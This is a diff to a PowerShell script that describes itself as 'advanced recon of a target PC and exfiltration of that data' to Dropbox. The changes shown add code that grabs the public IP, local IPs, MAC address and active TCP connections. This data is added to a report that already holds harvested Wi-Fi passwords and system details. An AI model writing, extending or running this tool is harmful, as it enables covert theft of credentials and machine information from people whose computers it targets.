@@ -1,10 +1,10 @@
-.SYNOPSIS
-	This is an advanced recon of a target PC and exfiltration of that data
+#SYNOPSIS
+	#This is an advanced recon of a target PC and exfiltration of that data
 
-.DESCRIPTION 
-	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
-	All of the gather information is formatted neatly and output to a file 
-	That file is then exfiltrated to cloud storage via DropBox
+#DESCRIPTION 
+	#This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
+	#All of the gather information is formatted neatly and output to a file 
+	#That file is then exfiltrated to cloud storage via DropBox
 
 #>
 
@@ -134,14 +134,42 @@ try {
     $MAC = "Error getting MAC address"
 }
 
+# Retrieve Network Info
+try {
+    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
+    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
+    $localIP = $computerIPs -join ", "
+    $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
+    $IsDHCPEnabled = ($computerIPs.Count -gt 0)
+} catch {
+    $computerPubIP = "Error getting Public IP"
+    $localIP = "Error getting Local IP"
+    $MAC = "Error getting MAC address"
+    $IsDHCPEnabled = $false
+}
+
+# **Step 2: Active Connections and Listeners**
+try {
+    $activeConnections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
+    $ConnectionsInfo = ($activeConnections | Out-String)
+} catch {
+    $ConnectionsInfo = "Failed to retrieve active TCP connections."
+}
+
 ############################################################################################################################################################
 
 # Get System Information
 # Debug: Print System Details to Console
 Write-Host "Building System Details..."
 
+# Get System Info
 try {
-    # Build the System Details string
+    $computerSystem = Get-CimInstance CIM_ComputerSystem
+    $computerOS = Get-CimInstance Win32_OperatingSystem
+    $computerCPU = Get-CimInstance Win32_Processor
+    $computerBIOS = Get-CimInstance Win32_BIOS
+    $computerRAM = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
+
     $SystemDetails = @"
 System Manufacturer: $($computerSystem.Manufacturer)
 System Model: $($computerSystem.Model)
@@ -152,21 +180,10 @@ OS Serial Number: $($computerOS.SerialNumber)
 Install Date: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.InstallDate))
 Last Boot Time: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.LastBootUpTime))
 CPU: $($computerCPU.Name)
-CPU Manufacturer: $($computerCPU.Manufacturer)
-Max Clock Speed: $($computerCPU.MaxClockSpeed) MHz
-RAM Capacity: $computerRamCapacity
-Mainboard Manufacturer: $($computerMainboard.Manufacturer)
-Mainboard Model: $($computerMainboard.Product)
-
-Drives:
-@($driveInfo | Out-String)
+RAM Capacity: $([Math]::Round($computerRAM.Sum / 1GB, 2)) GB
 "@
-
-    # Debug: Output System Details to Console
-    Write-Host "System Details:" $SystemDetails
-
 } catch {
-    Write-Error "Failed to build System Details"
+    $SystemDetails = "Failed to retrieve system details."
 }
  
 # Main Script: Construct Full System Information
@@ -184,6 +201,9 @@ $SystemDetails
 
 Wi-Fi Passwords:
 $WiFiPasswords
+
+Active TCP Connections:
+$ConnectionsInfo
 "@
 
 # Debug: Output Full System Info to Console
